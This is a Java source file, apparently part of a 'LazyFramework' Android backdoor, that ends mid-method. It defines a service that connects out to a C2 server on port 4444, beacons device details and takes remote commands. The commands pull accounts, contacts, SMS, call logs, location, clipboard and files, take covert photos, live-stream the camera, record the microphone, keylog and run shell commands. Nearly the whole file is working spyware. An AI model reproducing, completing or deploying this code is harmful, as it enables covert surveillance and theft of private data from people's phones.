package com.lazyframework.backdoor;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;
import android.location.Location;
import android.location.LocationManager;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.media.MediaRecorder;

import androidx.camera.core.CameraSelector;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class AgentService extends Service {
    private static final String TAG = "LazyFramework";

    // ==================== GANTI DENGAN IP KOMPUTER ANDA ====================
    private static final String C2_HOST = "192.168.1.8"; // <-- GANTI INI!
    private static final int C2_PORT = 4444;
    // =======================================================================

    private CameraXHelper cameraXHelper;
    private static final String CHANNEL_ID = "agent_channel";

    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean isRunning = true;
    private boolean isConnected = false;
    private Handler mainHandler;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    // Reconnection
    private static final int RECONNECT_DELAY_MS = 15000;

    // Recording variables
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;

    // Keylogger variables
    private StringBuilder keyLogs = new StringBuilder();
    private boolean isKeylogging = false;

    // Streaming variables
    private boolean isStreaming = false;
    private Thread streamSenderThread;
    private int streamCameraId = 0;
    private int streamQuality = 70;
    private int streamFPS = 10;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Agent service created - AUTO MODE");

        mainHandler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        cameraXHelper = new CameraXHelper(this);

        // Start foreground service
        startForeground(1, getNotification("Initializing AUTO mode..."));

        startBackgroundThread();

        // Connect IMMEDIATELY
        mainHandler.post(() -> {
            Log.d(TAG, "AUTO: Starting immediate connection to C2...");
            connectToC2();
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Agent Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification getNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("LazyFramework Agent")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("LazyFramework Agent")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("AgentThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void connectToC2() {
        backgroundHandler.post(() -> {
            while (isRunning && !isConnected) {
                try {
                    Log.d(TAG, "Connecting to C2: " + C2_HOST + ":" + C2_PORT);
                    updateNotification("Connecting to " + C2_HOST + "...");

                    socket = new Socket();
                    socket.connect(new java.net.InetSocketAddress(C2_HOST, C2_PORT), 8000);
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                    isConnected = true;

                    // Send beacon immediately
                    sendBeacon();
                    Log.d(TAG, "Connected to C2 server successfully!");
                    updateNotification("Connected ✓");

                    // Start command listener
                    listenForCommands();

                } catch (Exception e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    isConnected = false;
                    updateNotification("Disconnected - retrying...");

                    // Close resources
                    closeConnection();

                    // Wait before retry
                    try {
                        Thread.sleep(RECONNECT_DELAY_MS);
                    } catch (InterruptedException ignored) {}
                }
            }
        });
    }

    private void listenForCommands() {
        backgroundHandler.post(() -> {
            try {
                String command;
                while (isRunning && isConnected && (command = in.readLine()) != null) {
                    Log.d(TAG, "Received command: " + command);
                    String response = executeCommand(command);
                    if (out != null && isConnected) {
                        out.println(response);
                        out.flush();
                        Log.d(TAG, "Response sent for: " + command);
                    }
                }
            } catch (IOException e) {
                Log.e(TAG, "Command listener error: " + e.getMessage());
                isConnected = false;
                closeConnection();

                // Reconnect
                if (isRunning) {
                    updateNotification("Disconnected - reconnecting...");
                    connectToC2();
                }
            }
        });
    }

    private void closeConnection() {
        try {
            if (in != null) {
                in.close();
                in = null;
            }
            if (out != null) {
                out.close();
                out = null;
            }
            if (socket != null) {
                socket.close();
                socket = null;
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing connection", e);
        }
        isConnected = false;
    }

    private void sendBeacon() {
        try {
            JSONObject beacon = new JSONObject();
            beacon.put("type", "beacon");
            beacon.put("device", android.os.Build.MODEL);
            beacon.put("android", android.os.Build.VERSION.RELEASE);
            beacon.put("manufacturer", android.os.Build.MANUFACTURER);
            beacon.put("id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            beacon.put("timestamp", System.currentTimeMillis());

            if (out != null) {
                out.println(beacon.toString());
                out.flush();
                Log.d(TAG, "Beacon sent");
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error sending beacon", e);
        }
    }

    private void updateNotification(String text) {
        mainHandler.post(() -> {
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.notify(1, getNotification(text));
            }
        });
    }

    private void showToastShort(String text) {
        mainHandler.post(() -> Toast.makeText(AgentService.this, text, Toast.LENGTH_SHORT).show());
    }

    private String executeCommand(String command) {
        Log.d(TAG, "Executing: " + command);

        try {
            // ==================== ACCOUNTS ====================
            if (command.equals("GET_ACCOUNTS")) {
                return getDeviceAccounts();
            } else if (command.equals("GET_GOOGLE_ACCOUNTS")) {
                return getGoogleAccounts();

            // ==================== DATA EXFILTRATION ====================
            } else if (command.equals("GET_CONTACTS")) {
                return getContacts();
            } else if (command.equals("GET_SMS")) {
                return getSMS();
            } else if (command.equals("GET_CALL_LOGS")) {
                return getCallLogs();
            } else if (command.equals("GET_GALLERY")) {
                return getGallery();
            } else if (command.equals("GET_INSTALLED_APPS")) {
                return getInstalledApps();
            } else if (command.equals("GET_LOCATION")) {
                return getLocation();
            } else if (command.equals("GET_DEVICE_INFO")) {
                return getDeviceInfo();
            } else if (command.equals("GET_CLIPBOARD")) {
                return getClipboard();
            } else if (command.equals("GET_FILES_LIST")) {
                return getFilesList("/sdcard");

            // ==================== CAMERA ====================
            } else if (command.equals("CAMERA_INFO")) {
                return getCameraInfo();
            } else if (command.equals("TAKE_PHOTO_BACK")) {
                return takePhotoBack();
            } else if (command.equals("TAKE_PHOTO_FRONT")) {
                return takePhotoFront();

            // ==================== LIVE STREAMING ====================
            } else if (command.equals("STREAM_START_BACK")) {
                return startLiveStream(0);
            } else if (command.equals("STREAM_START_FRONT")) {
                return startLiveStream(1);
            } else if (command.equals("STREAM_STOP")) {
                return stopLiveStream();
            } else if (command.startsWith("STREAM_QUALITY ")) {
                String qStr = command.substring(15).trim();
                try {
                    int q = Integer.parseInt(qStr);
                    streamQuality = Math.max(10, Math.min(100, q));
                    JSONObject result = new JSONObject();
                    result.put("status", "success");
                    result.put("quality", streamQuality);
                    return result.toString();
                } catch (Exception e) {
                    return "{\"status\":\"error\",\"message\":\"Invalid quality\"}";
                }

            // ==================== MEDIA ====================
            } else if (command.equals("RECORD_AUDIO")) {
                return recordAudio();
            } else if (command.equals("STOP_RECORDING")) {
                return stopRecording();

            // ==================== KEYLOGGER ====================
            } else if (command.equals("KEYLOG_START")) {
                return startKeylogger();
            } else if (command.equals("KEYLOG_STOP")) {
                return stopKeylogger();
            } else if (command.equals("KEYLOG_DUMP")) {
                return dumpKeylogs();

            // ==================== FILE & SYSTEM ====================
            } else if (command.startsWith("DOWNLOAD ")) {
                return downloadFile(command.substring(9));
            } else if (command.startsWith("BROWSE ")) {
                return browseDirectory(command.substring(7));
            } else if (command.equals("PING")) {
                JSONObject pong = new JSONObject();
                pong.put("status", "PONG");
                pong.put("timestamp", System.currentTimeMillis());
                return pong.toString();
            } else if (command.equals("HELP")) {
                return getHelp();
            } else if (command.startsWith("SHELL ")) {
                return executeSystemCommand(command.substring(6));
            } else {
                JSONObject result = new JSONObject();
                result.put("status", "unknown_command");
                result.put("command", command);
                return result.toString();
            }

        } catch (Exception e) {
            Log.e(TAG, "Command execution error", e);
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    // ==================== ACCOUNTS METHODS ====================

    private String getDeviceAccounts() {
        try {
            if (checkSelfPermission(android.Manifest.permission.GET_ACCOUNTS)
                    != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "GET_ACCOUNTS");
                return result.toString();
            }

            AccountManager accountManager = AccountManager.get(this);
            Account[] accounts = accountManager.getAccounts();

            JSONArray accountsArray = new JSONArray();
            Set<String> uniqueAccounts = new HashSet<>();

            for (Account account : accounts) {
                String accountKey = account.type + ":" + account.name;
                if (uniqueAccounts.contains(accountKey)) continue;
                uniqueAccounts.add(accountKey);

                JSONObject accObj = new JSONObject();
                accObj.put("name", account.name);
                accObj.put("type", account.type);
                accountsArray.put(accObj);
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", accountsArray.length());
            result.put("data", accountsArray);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String getGoogleAccounts() {
        try {
            if (checkSelfPermission(android.Manifest.permission.GET_ACCOUNTS)
                    != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "GET_ACCOUNTS permission required");
                return result.toString();
            }

            AccountManager accountManager = AccountManager.get(this);
            Account[] accounts = accountManager.getAccountsByType("com.google");

            JSONArray accountsArray = new JSONArray();
            for (Account account : accounts) {
                JSONObject accObj = new JSONObject();
                accObj.put("email", account.name);
                accObj.put("type", "Google");
                accountsArray.put(accObj);
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", accountsArray.length());
            result.put("data", accountsArray);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    // ==================== CAMERA METHODS ====================

    private String getCameraInfo() {
        final String[] result = new String[1];
        final CountDownLatch latch = new CountDownLatch(1);

        cameraXHelper.getCameraInfo(new CameraXHelper.CameraInfoCallback() {
            @Override
            public void onResult(boolean hasBackCamera, boolean hasFrontCamera) {
                try {
                    JSONObject resultObj = new JSONObject();
                    JSONArray cameras = new JSONArray();
                    int id = 0;

                    if (hasBackCamera) {
                        JSONObject back = new JSONObject();
                        back.put("id", id++);
                        back.put("facing", "BACK");
                        cameras.put(back);
                    }
                    if (hasFrontCamera) {
                        JSONObject front = new JSONObject();
                        front.put("id", id++);
                        front.put("facing", "FRONT");
                        cameras.put(front);
                    }

                    resultObj.put("status", "success");
                    resultObj.put("cameras", cameras);
                    resultObj.put("count", cameras.length());
                    result[0] = resultObj.toString();
                } catch (JSONException e) {
                    result[0] = "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
                }
                latch.countDown();
            }

            @Override
            public void onError(String error) {
                result[0] = "{\"status\":\"error\",\"message\":\"" + error + "\"}";
                latch.countDown();
            }
        });

        try {
            latch.await(8000, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            return "{\"error\": \"Timeout\"}";
        }

        return result[0] != null ? result[0] : "{\"error\": \"Unknown\"}";
    }

    private String takePhotoBack() {
        return takePhotoWithLens(CameraSelector.LENS_FACING_BACK);
    }

    private String takePhotoFront() {
        return takePhotoWithLens(CameraSelector.LENS_FACING_FRONT);
    }

    private String takePhotoWithLens(int lensFacing) {
        final String[] resultHolder = new String[1];
        final CountDownLatch latch = new CountDownLatch(1);

        mainHandler.post(() -> {
            CameraXHelper.PhotoCallback callback = new CameraXHelper.PhotoCallback() {
                @Override
                public void onSuccess(String filePath) {
                    Log.d(TAG, "Photo captured: " + filePath);
                    resultHolder[0] = encodeFileToBase64(filePath);
                    if (resultHolder[0] == null) {
                        try {
                            JSONObject error = new JSONObject();
                            error.put("status", "error");
                            error.put("message", "Failed to encode photo");
                            resultHolder[0] = error.toString();
                        } catch (JSONException e) {
                            resultHolder[0] = "{\"error\":\"Encode failed\"}";
                        }
                    }
                    latch.countDown();
                }

                @Override
                public void onError(String error) {
                    Log.e(TAG, "Photo error: " + error);
                    try {
                        JSONObject err = new JSONObject();
                        err.put("status", "error");
                        err.put("message", error);
                        resultHolder[0] = err.toString();
                    } catch (JSONException e) {
                        resultHolder[0] = "{\"error\":\"" + error + "\"}";
                    }
                    latch.countDown();
                }
            };

            if (lensFacing == CameraSelector.LENS_FACING_FRONT) {
                cameraXHelper.takePhotoFront(callback);
            } else {
                cameraXHelper.takePhotoBack(callback);
            }
        });

        try {
            boolean finished = latch.await(15000, TimeUnit.MILLISECONDS);
            if (!finished) {
                return "{\"error\": \"Timeout\"}";
            }
        } catch (InterruptedException e) {
            return "{\"error\": \"Interrupted\"}";
        }

        return resultHolder[0] != null ? resultHolder[0] : "{\"error\": \"No result\"}";
    }

    private String encodeFileToBase64(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() == 0) {
                return null;
            }

            byte[] data = new byte[(int) file.length()];
            try (FileInputStream fis = new FileInputStream(file)) {
                fis.read(data);
            }

            String encoded = Base64.encodeToString(data, Base64.NO_WRAP);
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("data", encoded);
            result.put("size", data.length);
            result.put("filename", file.getName());
            
            // Delete after encoding to save space
            file.delete();
            
            return result.toString();
        } catch (Exception e) {
            Log.e(TAG, "Encode error: " + e.getMessage());
            return null;
        }
    }

    // ==================== LIVE STREAMING ====================

    private String startLiveStream(int cameraId) {
        if (isStreaming) {
            return "{\"status\":\"already_streaming\"}";
        }

        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return "{\"status\":\"permission_denied\",\"message\":\"CAMERA permission required\"}";
        }

        isStreaming = true;
        streamCameraId = cameraId;
        final int lensFacing = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;

        streamSenderThread = new Thread(() -> {
            Log.d(TAG, "Stream thread started for camera: " + cameraId);
            int frameCount = 0;
            
            while (isStreaming && isConnected && out != null) {
                try {
                    final CountDownLatch latch = new CountDownLatch(1);
                    final byte[][] frameHolder = new byte[1][];
                    
                    mainHandler.post(() -> {
                        cameraXHelper.takePhotoForStream(new CameraXHelper.PhotoCallback() {
                            @Override
                            public void onSuccess(String filePath) {
                                try {
                                    File file = new File(filePath);
                                    if (file.exists() && file.length() > 0) {
                                        FileInputStream fis = new FileInputStream(file);
                                        byte[] data = new byte[(int) file.length()];
                                        fis.read(data);
                                        fis.close();
                                        frameHolder[0] = data;
                                        file.delete();
                                    }
                                } catch (Exception e) {
                                    Log.e(TAG, "Stream frame error: " + e.getMessage());
                                }
                                latch.countDown();
                            }

                            @Override
                            public void onError(String error) {
                                Log.e(TAG, "Stream error: " + error);
                                latch.countDown();
                            }
                        }, lensFacing);
                    });
                    
                    boolean finished = latch.await(500, TimeUnit.MILLISECONDS);
                    
                    if (finished && frameHolder[0] != null && frameHolder[0].length > 0) {
                        String encoded = Base64.encodeToString(frameHolder[0], Base64.NO_WRAP);
                        if (out != null && isConnected) {
                            out.println("STREAM_FRAME:" + encoded);
                            out.flush();
                            frameCount++;
                            if (frameCount % 30 == 0) {
                                Log.d(TAG, "Streamed " + frameCount + " frames");
                            }
                        }
                    } else {
                        Thread.sleep(100);
                    }
                    
                    Thread.sleep(1000 / streamFPS);
                    
                } catch (InterruptedException e) {
                    Log.d(TAG, "Stream thread interrupted");
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Stream loop error: " + e.getMessage());
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                }
            }
            Log.d(TAG, "Stream thread ended, frames sent: " + frameCount);
        });

        streamSenderThread.start();

        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "Live stream started (Camera " + (cameraId == 1 ? "FRONT" : "BACK") + ")");
            result.put("fps", streamFPS);
            result.put("quality", streamQuality);
            return result.toString();
        } catch (JSONException e) {
            return "{\"status\":\"success\"}";
        }
    }

    private String stopLiveStream() {
        isStreaming = false;
        if (streamSenderThread != null) {
            streamSenderThread.interrupt();
            streamSenderThread = null;
        }
        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "Live stream stopped");
        } catch (JSONException e) {}
        return result.toString();
    }

    // ==================== DATA EXFILTRATION ====================

    private String getContacts() {
        JSONArray contacts = new JSONArray();
        Cursor cursor = null;

        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_CONTACTS");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String name = getColumnValue(cursor, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    String number = getColumnValue(cursor, ContactsContract.CommonDataKinds.Phone.NUMBER);
                    contact.put("name", name != null ? name : "");
                    contact.put("number", number != null ? number : "");
                    contacts.put(contact);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", contacts.length());
            result.put("data", contacts);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getSMS() {
        JSONArray messages = new JSONArray();
        Cursor cursor = null;

        try {
            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_SMS");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject msg = new JSONObject();
                    String address = getColumnValue(cursor, Telephony.Sms.ADDRESS);
                    String body = getColumnValue(cursor, Telephony.Sms.BODY);
                    String date = getColumnValue(cursor, Telephony.Sms.DATE);

                    msg.put("from", address != null ? address : "");
                    msg.put("body", body != null ? body : "");
                    if (date != null) {
                        msg.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    messages.put(msg);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", messages.length());
            result.put("data", messages);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getCallLogs() {
        JSONArray calls = new JSONArray();
        Cursor cursor = null;

        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_CALL_LOG");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    String number = getColumnValue(cursor, CallLog.Calls.NUMBER);
                    String duration = getColumnValue(cursor, CallLog.Calls.DURATION);
                    String date = getColumnValue(cursor, CallLog.Calls.DATE);
                    String type = getColumnValue(cursor, CallLog.Calls.TYPE);

                    call.put("number", number != null ? number : "");
                    call.put("duration", duration != null ? duration : "");
                    call.put("type", getCallType(type));
                    if (date != null) {
                        call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    calls.put(call);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", calls.length());
            result.put("data", calls);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getCallType(String type) {
        if (type == null) return "Unknown";
        try {
            int t = Integer.parseInt(type);
            switch (t) {
                case CallLog.Calls.INCOMING_TYPE: return "Incoming";
                case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
                case CallLog.Calls.MISSED_TYPE: return "Missed";
                default: return "Unknown";
            }
        } catch (NumberFormatException e) {
            return "Unknown";
        }
    }

    private String getGallery() {
        JSONArray images = new JSONArray();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                        != PackageManager.PERMISSION_GRANTED) {
                    JSONObject result = new JSONObject();
                    result.put("status", "error");
                    result.put("message", "Storage permission denied");
                    return result.toString();
                }
            }

            Cursor cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{MediaStore.Images.Media.DISPLAY_NAME,
                            MediaStore.Images.Media.DATE_TAKEN,
                            MediaStore.Images.Media.SIZE},
                    null, null, MediaStore.Images.Media.DATE_TAKEN + " DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject image = new JSONObject();
                    String name = getColumnValue(cursor, MediaStore.Images.Media.DISPLAY_NAME);
                    String date = getColumnValue(cursor, MediaStore.Images.Media.DATE_TAKEN);
                    String size = getColumnValue(cursor, MediaStore.Images.Media.SIZE);

                    image.put("name", name != null ? name : "");
                    if (date != null) {
                        image.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                                .format(new Date(Long.parseLong(date))));
                    }
                    image.put("size", size != null ? formatFileSize(Long.parseLong(size)) : "0");
                    images.put(image);
                } while (cursor.moveToNext());
                cursor.close();
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", images.length());
            result.put("data", images);
            return result.toString();

        } catch (Exception e) {
            JSONObject result = new JSONObject();
            try {
                result.put("status", "error");
                result.put("message", e.getMessage());
            } catch (JSONException je) {}
            return result.toString();
        }
    }

    private String getInstalledApps() {
        JSONArray apps = new JSONArray();
        PackageManager pm = getPackageManager();
        List<android.content.pm.ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (android.content.pm.ApplicationInfo appInfo : packages) {
            try {
                if ((appInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) {
                    continue;
                }
                JSONObject app = new JSONObject();
                app.put("name", pm.getApplicationLabel(appInfo).toString());
                app.put("package", appInfo.packageName);
                apps.put(app);
            } catch (JSONException e) {
                Log.e(TAG, "Error parsing app info", e);
            }
        }

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", apps.length());
            result.put("data", apps);
            return result.toString();
        } catch (JSONException e) {
            return apps.toString();
        }
    }

    private String getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                    checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                return result.toString();
            }

            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }

            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("status", "success");
                loc.put("latitude", location.getLatitude());
                loc.put("longitude", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("provider", location.getProvider());
                String mapsUrl = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                loc.put("maps_url", mapsUrl);
                return loc.toString();
            }

            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Location not available");
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("status", "success");
            info.put("model", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
            info.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            info.put("battery", getBatteryPercentage());
            info.put("is_charging", isCharging());
            info.put("total_storage", getTotalStorage());
            info.put("free_storage", getFreeStorage());
            info.put("timestamp", new Date().toString());
            return info.toString();
        } catch (JSONException e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String getClipboard() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard.hasPrimaryClip()) {
                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                    if (item.getText() != null) {
                        JSONObject result = new JSONObject();
                        result.put("status", "success");
                        result.put("content", item.getText().toString());
                        return result.toString();
                    }
                }
            }
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("content", "Clipboard is empty");
            return result.toString();
        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String getFilesList(String path) {
        JSONArray files = new JSONArray();
        try {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                File[] fileList = dir.listFiles();
                if (fileList != null) {
                    for (File file : fileList) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("is_directory", file.isDirectory());
                        fileInfo.put("size", file.length());
                        fileInfo.put("size_formatted", formatFileSize(file.length()));
                        files.put(fileInfo);
                    }
                }
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("path", path);
            result.put("count", files.length());
            result.put("data", files);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String browseDirectory(String path) {
        return getFilesList(path);
    }

    private String downloadFile(String filePath) {
        return encodeFileToBase64(filePath);
    }

    // ==================== MEDIA RECORDING ====================

    private String recordAudio() {
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "RECORD_AUDIO");
                return result.toString();
            }

            audioFilePath = getExternalFilesDir(null).getAbsolutePath() +
                    "/audio_" + System.currentTimeMillis() + ".3gp";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            // Auto stop after 30 seconds
            new Thread(() -> {
                try {
                    Thread.sleep(30000);
                    if (isRecording) {
                        stopRecording();
                    }
                } catch (InterruptedException e) {
                    Log.e(TAG, "Timer error", e);
                }
            }).start();

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Recording started");
            result.put("duration", "30 seconds");
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    private String stopRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;

                return encodeFileToBase64(audioFilePath);
            }

            JSONObject result = new JSONObject();
            result.put("status", "info");
            result.put("message", "No active recording");
            return result.toString();

        } catch (Exception e) {
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }

    // ==================== KEYLOGGER ====================

    private String startKeylogger() {
        isKeylogging = true;
        keyLogs.append("=== KEYLOGGER STARTED AT ").append(new Date()).append(" ===\n");
        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "Keylogger started");
        } catch (JSONException e) {
            return "{\"status\": \"Keylogger started\"}";
        }
        return result.toString();
    }

    private String stopKeylogger() {
        isKeylogging = false;
        keyLogs.append("=== KEYLOGGER STOPPED AT ").append(new Date()).append(" ===\n");
        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "Keylogger stopped");
        } catch (JSONException e) {
            return "{\"status\": \"Keylogger stopped\"}";
        }
        return result.toString();
    }

    private String dumpKeylogs() {
        String logs = keyLogs.toString();
        keyLogs.setLength(0);
        keyLogs.append("=== NEW SESSION STARTED ===\n");

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("logs", logs);
            result.put("length", logs.length());
            return result.toString();
        } catch (JSONException e) {
            return "{\"logs\": \"" + logs.replace("\"", "\\\"") + "\"}";
        }
    }

    // ==================== UTILITY METHODS ====================

    private String executeSystemCommand(String command) {
        try {
